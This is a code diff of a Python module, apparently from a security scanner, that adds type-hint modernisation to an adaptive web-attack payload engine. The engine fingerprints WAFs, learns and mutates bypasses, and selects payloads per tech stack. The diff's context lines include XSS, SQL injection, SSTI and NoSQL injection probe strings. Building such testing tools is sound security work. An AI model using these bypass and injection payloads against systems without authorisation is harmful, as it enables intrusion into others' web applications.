@@ -15,9 +15,9 @@ import time
 from collections import defaultdict
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Any, Dict, List, Optional, Set, Tuple
+from typing import Any
 
-from titan.ai.payloadforge import PayloadForge  # noqa: E402
+from titan.ai.payloadforge import PayloadForge
 from titan.ai.waf_profiles import (
     ERROR_DIALECT_PATTERNS,
     WAF_FINGERPRINT_PAYLOADS,
@@ -32,8 +32,8 @@ class PayloadResult:
     attack_type: str
     status: int
     blocked: bool
-    waf_detected: Optional[str] = None
-    error_class: Optional[str] = None
+    waf_detected: str | None = None
+    error_class: str | None = None
     timestamp: float = field(default_factory=time.time)
 
 
@@ -41,9 +41,9 @@ class PayloadResult:
 class WAFProfile:
     """WAF-specific bypass rules and learned patterns."""
     name: str
-    bypass_techniques: List[str] = field(default_factory=list)
-    blocked_patterns: List[str] = field(default_factory=list)
-    successful_bypasses: List[str] = field(default_factory=list)
+    bypass_techniques: list[str] = field(default_factory=list)
+    blocked_patterns: list[str] = field(default_factory=list)
+    successful_bypasses: list[str] = field(default_factory=list)
     scan_count: int = 0
     block_rate: float = 0.0
 
@@ -52,15 +52,15 @@ class WAFProfile:
 class TargetProfile:
     """Target-specific payload preferences learned during scan."""
     url: str
-    tech_stack: List[str] = field(default_factory=list)
-    waf: Optional[str] = None
-    baas_type: Optional[str] = None  # supabase, firebase, appwrite
-    auth_type: Optional[str] = None  # jwt, session, oauth, clerk
-    framework: Optional[str] = None  # react, vue, next, django, flask
-    language: Optional[str] = None   # python, javascript, php, java
-    blocked_patterns: List[str] = field(default_factory=list)
-    successful_patterns: List[str] = field(default_factory=list)
-    error_patterns: List[str] = field(default_factory=list)
+    tech_stack: list[str] = field(default_factory=list)
+    waf: str | None = None
+    baas_type: str | None = None  # supabase, firebase, appwrite
+    auth_type: str | None = None  # jwt, session, oauth, clerk
+    framework: str | None = None  # react, vue, next, django, flask
+    language: str | None = None   # python, javascript, php, java
+    blocked_patterns: list[str] = field(default_factory=list)
+    successful_patterns: list[str] = field(default_factory=list)
+    error_patterns: list[str] = field(default_factory=list)
 
 
 class ResponseAnalyzer:
@@ -74,9 +74,9 @@ class ResponseAnalyzer:
     ERROR_DIALECT_PATTERNS = ERROR_DIALECT_PATTERNS
 
     @classmethod
-    def analyze_blocked(cls, payload: str, status: int, body: str, headers: Dict[str, str]) -> Dict[str, Any]:
+    def analyze_blocked(cls, payload: str, status: int, body: str, headers: dict[str, str]) -> dict[str, Any]:
         """Analyze WHY a payload was blocked."""
-        analysis: Dict[str, Any] = {
+        analysis: dict[str, Any] = {
             "blocked": True,
             "status": status,
             "waf_rule": None,
@@ -113,7 +113,7 @@ class ResponseAnalyzer:
         return analysis
 
     @classmethod
-    def _suggest_bypass(cls, analysis: Dict[str, Any]) -> Optional[str]:
+    def _suggest_bypass(cls, analysis: dict[str, Any]) -> str | None:
         """Suggest a bypass based on analysis."""
         rule = analysis.get("waf_rule")
         pattern = analysis.get("blocked_pattern")
@@ -149,9 +149,9 @@ class ResponseAnalyzer:
         return None
 
     @classmethod
-    def analyze_success(cls, payload: str, status: int, body: str, headers: Dict[str, str]) -> Dict[str, Any]:
+    def analyze_success(cls, payload: str, status: int, body: str, headers: dict[str, str]) -> dict[str, Any]:
         """Analyze WHY a payload succeeded."""
-        analysis: Dict[str, Any] = {
+        analysis: dict[str, Any] = {
             "blocked": False,
             "status": status,
             "dialect": None,
@@ -190,7 +190,7 @@ class ResponseAnalyzer:
         return analysis
 
     @classmethod
-    def fingerprint_waf(cls, response_func, target_url: str) -> Dict[str, Any]:
+    def fingerprint_waf(cls, response_func, target_url: str) -> dict[str, Any]:
         """Fingerprint the WAF by sending test payloads."""
         # This would be called with a response function
         # For now, return a basic fingerprint structure
@@ -208,13 +208,13 @@ class PayloadChainGenerator:
     """Generate multi-layer encoded payload chains."""
 
     @staticmethod
-    def generate_chains(payload: str, max_chains: int = 10) -> List[str]:
+    def generate_chains(payload: str, max_chains: int = 10) -> list[str]:
         """Generate chained encoding payloads."""
         chains = []
 
         # Chain 1: URL → Base64
-        from urllib.parse import quote
         import base64
+        from urllib.parse import quote
         url_encoded = quote(payload, safe="")
         b64_of_url = base64.b64encode(url_encoded.encode()).decode()
         chains.append(b64_of_url)
@@ -300,7 +300,7 @@ class ContextAwarePayloadSelector:
     """Select payloads based on WHERE the injection is."""
 
     @staticmethod
-    def get_context_payloads(attack_type: str, context: InjectionContext) -> List[str]:
+    def get_context_payloads(attack_type: str, context: InjectionContext) -> list[str]:
         """Get payloads optimized for the injection context."""
         payloads = []
 
@@ -318,7 +318,7 @@ class ContextAwarePayloadSelector:
         return payloads
 
     @staticmethod
-    def _html_attribute_payloads(attack_type: str) -> List[str]:
+    def _html_attribute_payloads(attack_type: str) -> list[str]:
         if attack_type == "xss":
             return [
                 '" onfocus=alert(1) autofocus="',
@@ -332,7 +332,7 @@ class ContextAwarePayloadSelector:
         return []
 
     @staticmethod
-    def _js_string_payloads(attack_type: str) -> List[str]:
+    def _js_string_payloads(attack_type: str) -> list[str]:
         if attack_type == "xss":
             return [
                 "';alert(1);//",
@@ -347,7 +347,7 @@ class ContextAwarePayloadSelector:
         return []
 
     @staticmethod
-    def _sql_query_payloads(attack_type: str) -> List[str]:
+    def _sql_query_payloads(attack_type: str) -> list[str]:
         if attack_type == "sqli":
             return [
                 "' OR '1'='1",
@@ -360,7 +360,7 @@ class ContextAwarePayloadSelector:
         return []
 
     @staticmethod
-    def _template_payloads(attack_type: str) -> List[str]:
+    def _template_payloads(attack_type: str) -> list[str]:
         if attack_type == "ssti":
             return [
                 "{{7*7}}",
@@ -373,7 +373,7 @@ class ContextAwarePayloadSelector:
         return []
 
     @staticmethod
-    def _json_value_payloads(attack_type: str) -> List[str]:
+    def _json_value_payloads(attack_type: str) -> list[str]:
         if attack_type == "nosqli":
             return [
                 '{"$ne": null}',
@@ -436,11 +436,11 @@ class PayloadPrioritizer:
 
     @staticmethod
     def prioritize(
-        payloads: List[str],
-        target_profile: Optional[TargetProfile] = None,
-        waf_profile: Optional[WAFProfile] = None,
-        error_dialect: Optional[str] = None,
-    ) -> List[str]:
+        payloads: list[str],
+        target_profile: TargetProfile | None = None,
+        waf_profile: WAFProfile | None = None,
+        error_dialect: str | None = None,
+    ) -> list[str]:
         """Rank payloads by likelihood of success."""
         scored = []
 
@@ -458,19 +458,15 @@ class PayloadPrioritizer:
     @staticmethod
     def _score_payload(
         payload: str,
-        target_profile: Optional[TargetProfile],
-        waf_profile: Optional[WAFProfile],
-        error_dialect: Optional[str],
+        target_profile: TargetProfile | None,
+        waf_profile: WAFProfile | None,
+        error_dialect: str | None,
     ) -> float:
         score = 0.5  # Base score
 
         # Boost if payload matches target's dialect
         if error_dialect:
-            if error_dialect == "mysql" and "mysql" in payload.lower():
-                score += 0.2
-            elif error_dialect == "postgresql" and "pg_" in payload.lower():
-                score += 0.2
-            elif error_dialect == "mssql" and "waitfor" in payload.lower():
+            if (error_dialect == "mysql" and "mysql" in payload.lower()) or (error_dialect == "postgresql" and "pg_" in payload.lower()) or (error_dialect == "mssql" and "waitfor" in payload.lower()):
                 score += 0.2
 
         # Boost if payload is short (less likely to be blocked)
@@ -495,15 +491,15 @@ class PayloadPrioritizer:
 class AdaptivePayloadEngine:
     """Learns from observed blocks and generates context-aware payloads."""
 
-    def __init__(self, config: Optional[Dict[str, Any]] = None):
+    def __init__(self, config: dict[str, Any] | None = None):
         self.config = config or {}
         self.forge = PayloadForge()
-        self.profiles: Dict[str, TargetProfile] = {}
-        self.waf_profiles: Dict[str, WAFProfile] = {}
-        self.payload_history: List[PayloadResult] = []
-        self._learned_bypasses: Dict[str, List[str]] = defaultdict(list)
+        self.profiles: dict[str, TargetProfile] = {}
+        self.waf_profiles: dict[str, WAFProfile] = {}
+        self.payload_history: list[PayloadResult] = []
+        self._learned_bypasses: dict[str, list[str]] = defaultdict(list)
         self._state_file = Path("findings") / "payload_learning.json"
-        self._error_dialect: Optional[str] = None
+        self._error_dialect: str | None = None
         self._load_state()
 
     def _load_state(self) -> None:
@@ -544,7 +540,7 @@ class AdaptivePayloadEngine:
 
     # ── Target Profile ──────────────────────────────────────────────────
 
-    def create_target_profile(self, url: str, fingerprint: Dict[str, Any]) -> TargetProfile:
+    def create_target_profile(self, url: str, fingerprint: dict[str, Any]) -> TargetProfile:
         """Create a target profile from fingerprint data."""
         profile = TargetProfile(url=url)
 
@@ -608,7 +604,7 @@ class AdaptivePayloadEngine:
         self.profiles[url] = profile
         return profile
 
-    def get_target_profile(self, url: str) -> Optional[TargetProfile]:
+    def get_target_profile(self, url: str) -> TargetProfile | None:
         """Get the target profile for a URL."""
         return self.profiles.get(url)
 
@@ -618,10 +614,10 @@ class AdaptivePayloadEngine:
         self,
         attack_type: str,
         target_url: str,
-        context: Optional[Dict[str, Any]] = None,
-        injection_context: Optional[InjectionContext] = None,
+        context: dict[str, Any] | None = None,
+        injection_context: InjectionContext | None = None,
         max_payloads: int = 30,
-    ) -> List[str]:
+    ) -> list[str]:
         """Generate adaptive payloads based on target profile and learned patterns."""
         context = context or {}
         profile = self.profiles.get(target_url)
@@ -678,7 +674,7 @@ class AdaptivePayloadEngine:
 
         return result
 
-    def _get_target_specific_payloads(self, attack_type: str, profile: TargetProfile) -> List[str]:
+    def _get_target_specific_payloads(self, attack_type: str, profile: TargetProfile) -> list[str]:
         """Generate payloads specific to the target's stack."""
         payloads = []
 
@@ -714,7 +710,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _get_waf_specific_bypasses(self, attack_type: str, waf: str) -> List[str]:
+    def _get_waf_specific_bypasses(self, attack_type: str, waf: str) -> list[str]:
         """Generate WAF-specific bypass payloads."""
         bypasses = []
 
@@ -800,7 +796,7 @@ class AdaptivePayloadEngine:
 
         return bypasses
 
-    def _get_learned_bypasses(self, attack_type: str, waf: Optional[str]) -> List[str]:
+    def _get_learned_bypasses(self, attack_type: str, waf: str | None) -> list[str]:
         """Get bypasses learned from previous scans."""
         bypasses = []
 
@@ -824,8 +820,8 @@ class AdaptivePayloadEngine:
         status: int,
         target_url: str,
         response_body: str = "",
-        response_headers: Optional[Dict[str, str]] = None,
-    ) -> Dict[str, Any]:
+        response_headers: dict[str, str] | None = None,
+    ) -> dict[str, Any]:
         """Record the result of a payload attempt for learning."""
         profile = self.profiles.get(target_url)
         waf = profile.waf if profile else None
@@ -881,7 +877,7 @@ class AdaptivePayloadEngine:
         self,
         status: int,
         body: str,
-        headers: Optional[Dict[str, str]] = None,
+        headers: dict[str, str] | None = None,
     ) -> bool:
         """Determine if a payload was blocked by WAF."""
         # Common block indicators
@@ -910,7 +906,7 @@ class AdaptivePayloadEngine:
 
         return False
 
-    def _extract_error_class(self, body: str) -> Optional[str]:
+    def _extract_error_class(self, body: str) -> str | None:
         """Extract error class from response body."""
         body_lower = body.lower() if body else ""
 
@@ -965,7 +961,7 @@ class AdaptivePayloadEngine:
         self,
         payload: str,
         attack_type: str,
-        waf: Optional[str],
+        waf: str | None,
     ) -> None:
         """Learn from successful bypasses for future scans."""
         key = f"{attack_type}:{waf or 'none'}"
@@ -981,7 +977,7 @@ class AdaptivePayloadEngine:
 
     # ── Target-Specific Payloads ────────────────────────────────────────
 
-    def _supabase_payloads(self, attack_type: str) -> List[str]:
+    def _supabase_payloads(self, attack_type: str) -> list[str]:
         """Supabase-specific attack payloads."""
         payloads = []
 
@@ -1039,7 +1035,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _firebase_payloads(self, attack_type: str) -> List[str]:
+    def _firebase_payloads(self, attack_type: str) -> list[str]:
         """Firebase-specific attack payloads."""
         payloads = []
 
@@ -1082,7 +1078,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _appwrite_payloads(self, attack_type: str) -> List[str]:
+    def _appwrite_payloads(self, attack_type: str) -> list[str]:
         """AppWrite-specific attack payloads."""
         payloads = []
 
@@ -1099,7 +1095,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _nextjs_payloads(self, attack_type: str) -> List[str]:
+    def _nextjs_payloads(self, attack_type: str) -> list[str]:
         """Next.js-specific attack payloads."""
         payloads = []
 
@@ -1122,7 +1118,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _django_payloads(self, attack_type: str) -> List[str]:
+    def _django_payloads(self, attack_type: str) -> list[str]:
         """Django-specific attack payloads."""
         payloads = []
 
@@ -1143,7 +1139,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _laravel_payloads(self, attack_type: str) -> List[str]:
+    def _laravel_payloads(self, attack_type: str) -> list[str]:
         """Laravel-specific attack payloads."""
         payloads = []
 
@@ -1171,7 +1167,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _php_payloads(self, attack_type: str) -> List[str]:
+    def _php_payloads(self, attack_type: str) -> list[str]:
         """PHP-specific attack payloads."""
         payloads = []
 
@@ -1198,7 +1194,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _python_payloads(self, attack_type: str) -> List[str]:
+    def _python_payloads(self, attack_type: str) -> list[str]:
         """Python-specific attack payloads."""
         payloads = []
 
@@ -1224,7 +1220,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _javascript_payloads(self, attack_type: str) -> List[str]:
+    def _javascript_payloads(self, attack_type: str) -> list[str]:
         """JavaScript-specific attack payloads."""
         payloads = []
 
@@ -1242,7 +1238,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _clerk_payloads(self, attack_type: str) -> List[str]:
+    def _clerk_payloads(self, attack_type: str) -> list[str]:
         """Clerk-specific attack payloads."""
         payloads = []
 
@@ -1267,7 +1263,7 @@ class AdaptivePayloadEngine:
 
         return payloads
 
-    def _auth0_payloads(self, attack_type: str) -> List[str]:
+    def _auth0_payloads(self, attack_type: str) -> list[str]:
         """Auth0-specific attack payloads."""
         payloads = []
 
@@ -1287,11 +1283,11 @@ class AdaptivePayloadEngine:
 
     def mutate_blocked_payloads(
         self,
-        blocked_payloads: List[str],
+        blocked_payloads: list[str],
         attack_type: str,
         target_url: str,
-        waf: Optional[str] = None,
-    ) -> List[str]:
+        waf: str | None = None,
+    ) -> list[str]:
         """Mutate payloads that were blocked to bypass WAF."""
         mutated = []
 
@@ -1316,7 +1312,7 @@ class AdaptivePayloadEngine:
 
         return result[:30]
 
-    def _waf_specific_mutations(self, payload: str, waf: str) -> List[str]:
+    def _waf_specific_mutations(self, payload: str, waf: str) -> list[str]:
         """Apply WAF-specific mutations."""
         mutations = []
 
@@ -1365,7 +1361,7 @@ class AdaptivePayloadEngine:
 
         return mutations
 
-    def _generic_mutations(self, payload: str) -> List[str]:
+    def _generic_mutations(self, payload: str) -> list[str]:
         """Apply generic mutations."""
         mutations = []
 
@@ -1393,7 +1389,7 @@ class AdaptivePayloadEngine:
 
         return mutations
 
-    def _encoding_mutations(self, payload: str) -> List[str]:
+    def _encoding_mutations(self, payload: str) -> list[str]:
         """Apply encoding mutations."""
         mutations = []
 
@@ -1426,7 +1422,7 @@ class AdaptivePayloadEngine:
 
     # ── Stats ───────────────────────────────────────────────────────────
 
-    def get_stats(self) -> Dict[str, Any]:
+    def get_stats(self) -> dict[str, Any]:
         """Get statistics about adaptive payload engine."""
         total = len(self.payload_history)
         blocked = sum(1 for r in self.payload_history if r.blocked)
@@ -1445,12 +1441,12 @@ class AdaptivePayloadEngine:
 
     async def test_concurrent_bypasses(
         self,
-        blocked_payloads: List[str],
+        blocked_payloads: list[str],
         attack_type: str,
         target_url: str,
-        waf: Optional[str] = None,
+        waf: str | None = None,
         max_concurrent: int = 5,
-    ) -> List[str]:
+    ) -> list[str]:
         """Test multiple bypasses concurrently to find what works."""
         import asyncio
 
@@ -1458,9 +1454,9 @@ class AdaptivePayloadEngine:
         mutated = self.mutate_blocked_payloads(blocked_payloads, attack_type, target_url, waf)
 
         # Test concurrently
-        successful: List[str] = []
-        
-        async def test_payload(payload: str) -> Optional[str]:
+        successful: list[str] = []
+
+        async def test_payload(payload: str) -> str | None:
             try:
                 # This would be called with actual HTTP client
                 # For now, return None (placeholder)
@@ -1470,10 +1466,10 @@ class AdaptivePayloadEngine:
 
         # Create tasks
         tasks = [test_payload(p) for p in mutated[:max_concurrent]]
-        
+
         # Run concurrently
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Collect successful bypasses (only actual payload strings count;
         # None placeholders and raised exceptions are skipped)
         for result in results:
